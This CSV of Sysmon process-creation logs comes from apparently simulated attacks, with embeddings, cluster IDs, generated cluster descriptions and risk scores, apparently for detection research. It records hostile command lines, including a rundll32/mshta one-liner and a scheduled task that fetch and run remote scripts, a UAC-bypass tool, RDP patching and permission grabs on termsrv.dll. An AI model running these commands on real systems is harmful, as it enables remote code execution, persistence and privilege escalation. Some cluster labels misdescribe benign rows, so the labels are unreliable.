Timestamp,Computer,Provider,EventID,CommandLine,Embedding,Cluster_DBSCAN,Cluster_KMeans,DBSCANClusterDescription,DBSCANClusterRiskScore
2020-07-02T17:51:37.819891Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,spooler.exe  payload.bin,"[-0.00029198  0.02113985  0.02271042 ...  0.01565083 -0.00226413
  0.00884569]",91,93,Execution of binary payloads using masqueraded system process names.,9
2020-08-02T16:24:26.809904Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""c:\windows\system32\cmd.exe""","[-0.00245407  0.02751344  0.02196618 ...  0.01478437 -0.00637046
  0.00759594]",0,69,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-08-02T16:24:28.640990Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,whoami,"[-0.02540258  0.00812723 -0.01238958 ...  0.00743084 -0.01388342
 -0.00870348]",0,171,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-10-17T16:27:08.081356Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,calc.exe,"[-0.00376399  0.00038942  0.01948499 ...  0.0230166  -0.00374123
 -0.00179119]",0,47,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-10-17T16:27:08.734365Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Program Files\WindowsApps\Microsoft.WindowsCalculator_10.2008.2.0_x64__8wekyb3d8bbwe\Calculator.exe"" -ServerName:App.AppXsm3pg4n7er43kdh1qp4e79f1j7am68r8.mca","[-0.0233154   0.0048264   0.04082519 ...  0.00666977 -0.01059174
 -0.00684576]",111,47,Administrative system utilities mixed with high-risk activities including UAC bypass via environment variable manipulation and RDP patching tools.,8
2020-10-17T16:27:10.464978Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\System32\RuntimeBroker.exe -Embedding,[0.00294429 0.02759419 0.00604388 ... 0.00794835 0.00446168 0.00472372],0,26,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-03-21T05:00:16.296125Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,usoclient  StartInteractiveScan,"[-0.00749081  0.00871623  0.01720343 ... -0.00592039 -0.01302515
 -0.00274984]",121,172,Obfuscation of an offensive network scanning tool via file attribute manipulation combined with the execution of a system update utility.,7
2020-03-21T05:00:17.980991Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"rundll32 windowscoredeviceinfo.dll,CreateBackdoor","[-0.00639794  0.01403088  0.00524339 ...  0.00131793 -0.00473275
 -0.0053567 ]",111,135,Administrative system utilities mixed with high-risk activities including UAC bypass via environment variable manipulation and RDP patching tools.,8
2020-03-21T05:00:39.226538Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,nc.exe  127.0.0.1 1337,"[-0.00032255  0.032652    0.0024212  ...  0.00866325 -0.01487543
 -0.00982585]",114,99,"Command cluster indicating network reconnaissance, lateral movement via SSH tunneling and SharpRDP, and post-exploitation activity including named pipe manipulation.",9
2020-03-21T05:00:39.441933Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe""","[-0.00134454  0.02818832  0.02092883 ...  0.0123168  -0.0077493
  0.00912768]",0,69,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-03-21T12:35:35.026859Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,sc  stop CDPSvc,"[-0.00513191  0.01623491 -0.00283487 ...  0.00858055 -0.00922616
 -0.00392689]",0,48,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-03-21T12:35:43.104080Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,sc  query CDPSvc,"[-0.0192895   0.0027617  -0.006765   ...  0.01516082 -0.02002942
 -0.01152523]",0,48,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-03-21T12:35:52.013993Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_18.2002.1101.0_x64__8wekyb3d8bbwe\LocalBridge.exe"" /InvokerPRAID: Microsoft.MicrosoftOfficeHub notifications","[ 0.00614461 -0.0035829   0.02509076 ...  0.0087001   0.00754954
 -0.00010173]",120,214,"This cluster indicates high-risk activity including system discovery, potential privilege escalation via Utility Manager, living-off-the-land execution with MSBuild, and explicit EDR alerts for renamed signed binary proxies and driver loading.",9
2020-03-21T12:35:55.876452Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,net  start CDPSvc,"[-0.001306    0.01168135  0.00270263 ...  0.01033499 -0.0116697
 -0.0176966 ]",0,48,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-03-21T12:35:55.897450Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\net1  start CDPSvc,"[ 0.00039187  0.01205681  0.00113385 ...  0.01817731 -0.01661253
 -0.01786929]",0,48,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-03-21T12:35:55.919332Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\svchost.exe -k LocalService -p -s CDPSvc,"[ 0.01316317  0.02311153  0.01723085 ...  0.02967205 -0.00841134
 -0.00701139]",0,251,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-03-21T21:45:04.922610Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\windows\system32\cmd.exe""","[-0.00179374  0.02704741  0.02220197 ...  0.01298562 -0.00662478
  0.00788928]",0,69,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-03-21T21:45:16.576327Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\svchost.exe -k netsvcs -p -s gpsvc,"[ 0.00852888  0.02667615  0.01699451 ...  0.02413484 -0.0132198
  0.00058607]",0,11,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-03-17T20:17:52.949107Z,PC04.example.corp,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\cmd.exe"" /C ""C:\Users\IEUser\Desktop\RDPWrap-v1.6.2\install.bat"" ","[ 0.02517846  0.02470893  0.02077892 ...  0.01340122 -0.00924322
  0.00171171]",45,181,"Installation and configuration of RDP Wrapper Library for enabling concurrent remote desktop sessions, often used for persistence or unauthorized remote access.",8
2019-03-17T20:17:52.979150Z,PC04.example.corp,Microsoft-Windows-Sysmon,1,"""C:\Users\IEUser\Desktop\RDPWrap-v1.6.2\RDPWInst""  -i -o","[ 0.01022287  0.00681314  0.01289609 ...  0.01273451 -0.00812473
 -0.00603009]",45,181,"Installation and configuration of RDP Wrapper Library for enabling concurrent remote desktop sessions, often used for persistence or unauthorized remote access.",8
2019-03-17T20:18:09.312636Z,PC04.example.corp,Microsoft-Windows-Sysmon,1,"netsh advfirewall firewall add rule name=""Remote Desktop"" dir=in protocol=tcp localport=3389 profile=any action=allow","[ 0.00137613  0.00848469  0.00425211 ... -0.00194476 -0.02251375
 -0.00254201]",102,180,Configuration of network port proxying and firewall rules to facilitate RDP connectivity and lateral movement.,9
2019-03-17T20:18:09.643112Z,PC04.example.corp,Microsoft-Windows-Sysmon,1,"C:\Windows\System32\rundll32.exe shell32.dll,SHCreateLocalServerRunDll {995C996E-D918-4a8c-A302-45719A6F4EA7} -Embedding",[0.00212737 0.02286254 0.01796112 ... 0.00843293 0.01150345 0.00747888],0,26,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-03-17T20:20:14.512665Z,PC04.example.corp,Microsoft-Windows-Sysmon,1,"""C:\Users\IEUser\Desktop\UniversalTermsrvPatch_20090425\UniversalTermsrvPatch_20090425\UniversalTermsrvPatch-x86.exe"" ","[ 0.01257005  0.01762993  0.01656628 ...  0.00303353 -0.00783643
 -0.00593382]",111,121,Administrative system utilities mixed with high-risk activities including UAC bypass via environment variable manipulation and RDP patching tools.,8
2019-03-17T20:20:17.907547Z,PC04.example.corp,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\takeown.exe"" /f  C:\Windows\System32\termsrv.dll","[-0.0087751   0.00763166  0.00583959 ... -0.00017781  0.00189435
 -0.00081927]",46,126,"Ownership and permission modification of the Remote Desktop service library (termsrv.dll) to grant full control, typically associated with RDP patching or unauthorized persistence.",9
2019-03-17T20:20:17.917561Z,PC04.example.corp,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\icacls.exe"" C:\Windows\System32\termsrv.dll /grant %%username%%:F","[ 0.00903597  0.01108005 -0.00990743 ... -0.00662939 -0.00079058
  0.00094679]",46,126,"Ownership and permission modification of the Remote Desktop service library (termsrv.dll) to grant full control, typically associated with RDP patching or unauthorized persistence.",9
2019-03-17T20:20:17.927576Z,PC04.example.corp,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\icacls.exe"" C:\Windows\System32\termsrv.dll /grant *S-1-1-0:(F)","[-0.00388309  0.015835   -0.00437195 ... -0.00201931  0.00860064
  0.00036129]",46,126,"Ownership and permission modification of the Remote Desktop service library (termsrv.dll) to grant full control, typically associated with RDP patching or unauthorized persistence.",9
2020-10-13T20:11:42.278672Z,LAPTOP-JU4M3I0E,Microsoft-Windows-Sysmon,1,c:\windows\system32\cmd.exe,"[-0.00071802  0.03543975  0.01767913 ...  0.01653921 -0.00781452
  0.00812219]",0,30,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2021-01-26T13:21:13.690036Z,LAPTOP-JU4M3I0E,Microsoft-Windows-Sysmon,1,C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\MSBuild\Current\Bin\MSBuild.exe /nologo /nodemode:1 /nodeReuse:true /low:false,"[ 0.01121411  0.03089015  0.01368683 ...  0.01438989 -0.00224639
 -0.01603577]",120,9,"This cluster indicates high-risk activity including system discovery, potential privilege escalation via Utility Manager, living-off-the-land execution with MSBuild, and explicit EDR alerts for renamed signed binary proxies and driver loading.",9
2021-01-26T13:21:13.978709Z,LAPTOP-JU4M3I0E,Microsoft-Windows-Sysmon,1,"""C:\windows\system32\cmd.exe""  /Q /D /C C:\Users\bouss\AppData\Local\Temp\tmpf890f11830e143ada2d718f706dd94c0.exec.cmd","[ 0.00036425  0.02266316  0.03004602 ...  0.01587785 -0.01267842
  0.00956016]",98,69,"Execution of suspicious binaries from temporary, redirected, or non-standard directories, including native process injection via mavinject.exe and Atomic Red Team testing frameworks.",10
2021-01-26T13:21:14.023510Z,LAPTOP-JU4M3I0E,Microsoft-Windows-Sysmon,1,powershell.exe   start-process notepad.exe,[0.00042775 0.01773235 0.02363103 ... 0.00862696 0.01222208 0.01000047],114,248,"Command cluster indicating network reconnaissance, lateral movement via SSH tunneling and SharpRDP, and post-exploitation activity including named pipe manipulation.",9
2021-01-26T13:21:14.296774Z,LAPTOP-JU4M3I0E,Microsoft-Windows-Sysmon,1,"""C:\windows\system32\notepad.exe"" ",[0.00375113 0.02008152 0.0179634  ... 0.01337039 0.00459032 0.00355762],0,61,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2021-01-26T13:21:14.428194Z,LAPTOP-JU4M3I0E,Microsoft-Windows-Sysmon,1,"""C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\MSBuild\Current\Bin\Tracker.exe"" @""C:\Users\bouss\AppData\Local\Temp\tmp5938b880d43743db91973c95f519f06b.tmp"" /c ""C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.26.28801\bin\HostX86\x86\CL.exe""  @""C:\Users\bouss\AppData\Local\Temp\tmp19546d957b6e4d15b83f93a323d5f087.rsp""","[ 0.01674945  0.02991006  0.02504622 ... -0.00196972 -0.01953619
 -0.00827967]",47,182,Routine software compilation and development activities using Microsoft Visual Studio build tools and compiler components.,1
2021-01-26T13:21:14.456487Z,LAPTOP-JU4M3I0E,Microsoft-Windows-Sysmon,1,"""C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.26.28801\bin\HostX86\x86\CL.exe"" @C:\Users\bouss\AppData\Local\Temp\tmp19546d957b6e4d15b83f93a323d5f087.rsp","[ 0.01698419  0.01672632  0.01618148 ...  0.00686629 -0.01101798
  0.00648106]",47,182,Routine software compilation and development activities using Microsoft Visual Studio build tools and compiler components.,1
2021-01-26T13:21:14.667701Z,LAPTOP-JU4M3I0E,Microsoft-Windows-Sysmon,1,"""C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.26.28801\bin\HostX86\x86\VCTIP.EXE""","[ 0.00400066  0.02228221  0.00189695 ...  0.01546118 -0.00704153
 -0.00713107]",47,92,Routine software compilation and development activities using Microsoft Visual Studio build tools and compiler components.,1
2019-05-23T17:26:08.716859Z,IEWIN7,Microsoft-Windows-Sysmon,1,msxsl.exe  c:\Users\IEUser\AppData\Roaming\Adobe\test.dat c:\Users\IEUser\AppData\Roaming\Adobe\test.dat,"[ 0.00907139  0.01795956  0.03086563 ...  0.01346369 -0.01198294
 -0.01459963]",111,74,Administrative system utilities mixed with high-risk activities including UAC bypass via environment variable manipulation and RDP patching tools.,8
2019-05-23T17:26:09.437896Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\cmd.exe"" ","[-0.00067154  0.02816515  0.02124834 ...  0.01230446 -0.00889199
  0.00824661]",0,69,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-05-21T15:32:57.286254Z,IEWIN7,Microsoft-Windows-Sysmon,1,"cmd.exe  /C rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();h=new%%20ActiveXObject(""WScript.Shell"").run(""mshta https://hotelesms.com/talsk.txt"",0,true);","[ 0.01526059  0.01329786  0.01754933 ...  0.00725021  0.00568254
 -0.00251998]",0,55,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-05-21T15:32:57.286254Z,IEWIN7,Microsoft-Windows-Sysmon,1,"rundll32.exe  javascript:""\..\mshtml,RunHTMLApplication "";document.write();h=new%%20ActiveXObject(""WScript.Shell"").run(""mshta https://hotelesms.com/talsk.txt"",0,true);","[ 0.01832092  0.01096382  0.01653018 ...  0.0081319   0.008337
 -0.00629038]",0,55,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-05-21T15:32:57.867089Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\mshta.exe"" https://hotelesms.com/talsk.txt","[ 0.01749637  0.01089783  0.00973896 ...  0.00616629  0.00251489
 -0.00913255]",0,55,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-05-21T15:32:59.769825Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\schtasks.exe"" /Create /sc MINUTE /MO 60 /TN MSOFFICE_ /TR ""mshta.exe https://hotelesms.com/Injection.txt"" /F ","[ 0.00413953  0.01133848  0.00016725 ...  0.00892593  0.01583108
 -0.00747599]",0,55,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-05-12T13:30:32.931756Z,IEWIN7,Microsoft-Windows-Sysmon,1,python  winpwnage.py -u execute -i 9 -p c:\Windows\system32\cmd.exe,"[ 0.00984652  0.02743855  0.01368072 ...  0.0102204  -0.00633687
 -0.00698985]",48,125,Multiple execution attempts of winpwnage.py targeting UAC bypass and privilege escalation to launch command shells and arbitrary DLLs.,9
2019-05-12T13:30:46.400506Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\rundll32.exe"" ieframe.dll,OpenURL c:\users\ieuser\appdata\local\temp\ieframe.url",[0.00259171 0.01980329 0.01923912 ... 0.01942348 0.00805942 0.00800218],0,73,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-05-12T13:32:58.167195Z,IEWIN7,Microsoft-Windows-Sysmon,1,"rundll32.exe  url.dll,OpenURL file://C:/Windows/system32/calc.exe","[-0.01447579  0.0058639   0.03908106 ...  0.01818557  0.01637944
 -0.00352414]",0,75,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-05-12T13:33:37.078801Z,IEWIN7,Microsoft-Windows-Sysmon,1,"rundll32.exe  url.dll,FileProtocolHandler calc.exe","[-0.00835542  0.0069528   0.03370189 ...  0.02288372  0.01604466
 -0.00057322]",0,75,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-05-12T13:33:59.743077Z,IEWIN7,Microsoft-Windows-Sysmon,1,"rundll32.exe  url.dll,FileProtocolHandler file://C:/Windows/system32/calc.exe","[-0.01038332  0.00906639  0.03819721 ...  0.02338838  0.01483217
 -0.00460697]",0,75,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-05-12T13:38:00.523670Z,IEWIN7,Microsoft-Windows-Sysmon,1,"rundll32.exe  url.dll,FileProtocolHandler file:///C:/programdata/calc.hta","[-0.00630428 -0.00013171  0.03014744 ...  0.01858134  0.00947511
 -0.00895981]",0,75,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-05-12T13:38:00.712733Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\mshta.exe"" ""C:\programdata\calc.hta"" ","[ 0.00302726 -0.00273299  0.01726483 ...  0.01438073 -0.00527861
 -0.01227875]",0,47,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-05-12T13:55:56.626501Z,IEWIN7,Microsoft-Windows-Sysmon,1,python  winpwnage.py -u execute -i 12 -p c:\Windows\System32\calc.exe,"[-0.00463678  0.01667615  0.02252123 ...  0.01691385 -0.004704
 -0.01555783]",48,17,Multiple execution attempts of winpwnage.py targeting UAC bypass and privilege escalation to launch command shells and arbitrary DLLs.,9
2019-05-12T13:56:12.652868Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\rundll32.exe"" shdocvw.dll,OpenURL c:\users\ieuser\appdata\local\temp\shdocvw.url",[0.00184533 0.02409117 0.02283092 ... 0.0217926  0.00846113 0.00441402],0,73,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
